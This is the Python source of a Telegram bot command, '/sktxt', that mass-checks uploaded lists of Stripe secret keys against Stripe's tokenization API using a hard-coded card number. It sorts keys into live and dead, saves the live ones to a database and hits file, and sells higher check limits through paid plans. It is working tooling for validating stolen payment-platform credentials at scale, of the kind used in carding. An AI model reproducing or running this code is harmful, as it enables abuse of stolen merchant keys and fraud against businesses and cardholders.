import time
import httpx
import threading
import asyncio
import json
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from TOOLS.check_all_func import *
from datetime import timedelta



def gcgenfunc(len=4):
    import random

    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return "".join(random.choice(chars) for _ in range(len))


async def getcc_for_sk(file_name, role):
    try:
        import os

        file = open(f"downloads/{file_name}").read().splitlines()
        os.remove(f"downloads/{file_name}")
        ccs = []
        for i in file:
            if "sk_" in i:
                ccs.append(i)

        if role == "FREE" and len(ccs) > 1501:
            resp = f"""<b>
Limit Reached ⚠️

Message: Your Can Check 1500 SK at a Time . Buy Plan to Increase Your Limit .

Type /buy For Paid Plan
</b>"""
            return False, resp
        elif role == "PREMIUM" and len(ccs) > 3001:
            resp = f"""<b>
Limit Reached ⚠️

Message: Your Can Check 3001 SK at a Time . Buy Plan to Increase Your Limit .

Type /buy For Paid Plan
</b>"""
            return False, resp
        elif len(ccs) == 0:
            resp = f"""<b>
SK Not Found ⚠️

Message: We Are Unable to Find Any SK Details From Your Input . Provide SK's Details To Check .
</b>"""
            return False, resp
        else:
            return True, ccs

    except:
        import traceback
        await error_log(traceback.format_exc())
        return False, "Try Again Later"
    

async def sk_checker_func(sk, session):
    try:
        url = "https://api.stripe.com/v1/tokens"
        data = {
            "card[number]": "5278540001668044",
            "card[exp_month]": "10",
            "card[exp_year]": "2029",
            "card[cvc]": "242",
        }
        headers = {
            "Authorization": f"Bearer {sk}",
        }
        result = await session.post(url, headers=headers, data=data)
        result = result.text
        return result
    except Exception as e:
        return str(e)


async def mass_sk_checker(sk, session):
    try:
        result = await sk_checker_func(sk, session)
        if "tok_" in result or '"cvc_check": "unchecked"' in result:
            response = "SK LIVE ✅"
            await addsk(sk)
            # await sendsk(sk, session)
            return sk, response, "YES"

        elif "rate limit" in result or "rate_limit" in result:
            response = "RATE LIMIT ⚠️"
            await addsk(sk)
            # await sendsk(sk, session)
            return sk, response, "YES"

        elif "api_key_expired" in result:
            response = "Invalid API Key ❌"
            return sk, response, "NO"

        elif "Expired API Key provided" in result:
            response = "Expired API Key ❌"
            return sk, response, "NO"
        elif "testmode_charges_only" in result:
            response = "Testmode Charges Key ❌"
            return sk, response, "NO"

        else:
            response = f"Dead Key❌"
            return sk, response, "NO"
    except Exception as e:
        return sk, str(e), "NO"


@Client.on_message(filters.command("sktxt", [".", "/"]))
def multi(Client, message):
    t1 = threading.Thread(target=bcall, args=(Client, message))
    t1.start()


def bcall(Client, message):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(stripe_mass_txt_auth_cmd(Client, message))
    loop.close()


async def stripe_mass_txt_auth_cmd(Client, message):
    try:
        user_id  = str(message.from_user.id)
        checkall = await check_some_thing(Client, message)
        if checkall[0] == False:
            return

        role = checkall[1]
        try:
            rnd       = gcgenfunc(len=8)
            key       = f"sktxt_{message.from_user.id}_{rnd}"
            file_name = f"{key}.txt"
            await message.reply_to_message.download(file_name=file_name)
        except:
            resp = """<b>
Gate Name: Mass Stripe Key Checker ✅
CMD: /sktxt

Message: No SK Found in your input ❌

Usage: /sktxt [ in reply to txt file ]
        </b> """
            await message.reply_text(resp, message.id)
            return

        getcc = await getcc_for_sk(file_name, role)
        if getcc[0] == False:
            await message.reply_text(getcc[1], message.id)
            return

        ccs = getcc[1]
        amt = len(ccs)
        text = f"""<b>
Gate : Mass txt Stripe Checker ✅

SK Amount : {len(ccs)}
Message : Checking SK For {user_id}
Note: This Pop Up Will Change After 100 SK Checked . So Keep Patient . 

Status : Processing...

Checked By <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> [ {role} ] 
Bot by - <a href="tg://user?id=7849826660">Angel</a>
    </b> """

        stats      = await message.reply_text(text, message.id)
        chk_done   = 0
        hits_count = 0
        start      = time.perf_counter()
        session    = httpx.AsyncClient(timeout = 30)
        works      = [mass_sk_checker(i, session) for i in ccs]
        worker_num = int(json.loads(open("FILES/config.json", "r" , encoding="utf-8").read())["THREADS"])

        while works:
            a = works[:worker_num]
            a = await asyncio.gather(*a)
            for i in a:
                chk_done += 1
                calc = chk_done % 100
                if i[2] == "YES":
                    cc       = i[0]
                    response = i[1]
                    hitsfile = f"HITS/{file_name}"
                    hits_count += 1
                    with open(hitsfile, "a", encoding="utf-8") as f:
                        hitresp = f"{cc}\nResult - {response}\n"
                        f.write(hitresp)

                if calc == 0:
                    cc       = i[0]
                    response = i[1]
                    dead = chk_done - hits_count
                    taken                     = str(timedelta(seconds=time.perf_counter() - start))
                    hours , minutes , seconds = map(float, taken.split(":"))
                    hour                      = int(hours)
                    min                       = int(minutes)

                    text = f"""<b>
Gates: MASS Stripe Key Checker

<code>{cc}</code>
Result - {response}

Total SK Input: {amt}
Hits: {hits_count} 
Dead: {dead}
Total Checked: {chk_done}
<i>( total checked status will be updated after 100 sk checked done . this is for telegram limitation of message.edit )</i>
Secret Key: <code>{key}</code>
<i>( if checker got stuck or bot got stopped , then you can easily get your hits.txt file by typing "/gethits secretkey" this commands. )</i>
Status: Checking


Checked By <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️ [ {role}]
Time Taken - {hour} Hours {min} Minutes
Bot by - <a href="tg://user?id=7849826660">Angel</a>
</b>"""
                    try:
                        await asyncio.sleep(0.5)
                        stats = await Client.edit_message_text(message.chat.id, stats.id, text)
                    except:
                        pass
            works = works[worker_num:]

        dead  = chk_done - hits_count
        taken                     = str(timedelta(seconds=time.perf_counter() - start))
        hours , minutes , seconds = map(float, taken.split(":"))
        hour                      = int(hours)
        min                       = int(minutes)

        await session.aclose()

        if hits_count != 0:
            await Client.delete_messages(message.chat.id, stats.id)
            text = f"""<b>
Gates: MASS Stripe Key Checker 
Total SK Input: {amt}
Hits: {hits_count} 
Dead: {dead}
Total Checked: {chk_done}
Secret Key: <code>{key}</code>
<i>( if checker got stuck or bot got stopped , then you can easily get your hits.txt file by typing "/gethits secretkey" this commands. )</i>
Status: Checked All ✅

Checked By <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️ [ {role}]
Time Taken - {hour} Hours {min} Minutes
Bot by - <a href="tg://user?id=7849826660">Angel</a>
</b>"""
            await message.reply_document(document = hitsfile , caption = text , reply_to_message_id = message.id )
            
        else:
            text = f"""<b>
Gates: MASS Stripe Key Checker
Total SK Input: {amt}
Hits: {hits_count} 
Dead: {dead}
Total Checked: {chk_done}
Secret Key: <code>{key}</code>
<i>( if checker got stuck or bot got stopped , then you can easily get your hits.txt file by typing "/gethits secretkey" this commands. )</i>
Status: Checked All ✅

Checked By <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️ [ {role}]
Time Taken - {hour} Hours {min} Minutes
Bot by - <a href="tg://user?id=7849826660">Angel</a>
</b>"""
            await Client.edit_message_text(message.chat.id, stats.id, text)

        await setantispamtime(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
